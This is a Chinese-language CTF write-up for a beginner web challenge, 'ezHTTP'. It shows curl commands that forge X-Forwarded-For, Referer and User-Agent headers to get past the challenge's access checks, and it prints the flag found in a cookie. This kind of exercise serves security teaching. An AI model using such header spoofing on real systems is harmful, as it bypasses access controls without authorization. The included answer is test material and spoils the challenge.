---
title: ezHTTP
author: SMJB
difficulty: Baby
category: Web
image: ghcr.io/svuctf/svuctf-helloworld-2024/ez_http:latest
port: 80
writeup_author: 13m0n4de
tags:
  - http
  - headers
reference:
---

## 题目描述

## 题目解析

本题考察 HTTP 请求头的基础知识。

使用浏览器访问靶机地址，页面返回：

> 必须从本地访问!

这提示我们需要伪造本地访问。

在 Web 应用中，通常使用 `X-Forwarded-For` 请求头来标识请求的真实来源 IP。我们可以尝试这个头为 `127.0.0.1`：

（如果你还不清楚如何发送 HTTP 请求，可以查看 [Param 题解 ](../param/README.md)中对于 HTTP 请求和相关工具的介绍）

```
$ curl -H "X-Forwarded-For: 127.0.0.1" http://<IP>:<PORT>
```

成功绕过第一道检查后，页面显示：

> 不是 genshin.edu.cn 来的我不要

这说明网站在检查请求的来源。

在 HTTP 协议中，`Referer` 头用于指示请求是从哪个页面跳转过来的。让我们加上这个头：

```
$ curl \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Referer: genshin.edu.cn" \
    http://<IP>:<PORT>
```

通过第二个检查后，得到新的提示：

> 请使用 svuctf 浏览器!

这是在检查 `User-Agent` 头，它用于标识发起请求的客户端类型。我们需要将其设置为 `svuctf`：

```
$ curl \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Referer: genshin.edu.cn" \
    -H "User-Agent: svuctf" \
    http://<IP>:<PORT>
```

满足所有条件后，页面显示：

> flag在小饼干里!

这提示我们 flag 被放在了 Cookie 中。使用 curl 的 -v 参数可以查看完整的响应头：

```
$ curl -v \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Referer: genshin.edu.cn" \
    -H "User-Agent: svuctf" \
    http://<IP>:<PORT>
```

可以在响应头中找到 `Set-Cookie` 字段，其中含有被 URL 编码过的 Flag 字符串。

```
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Thu, 31 Oct 2024 23:25:58 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/8.3.2
< Set-Cookie: flag=flag%7Bhttp_1s_s0_e%40sy%21_83bb6163346d%7D%0A
```
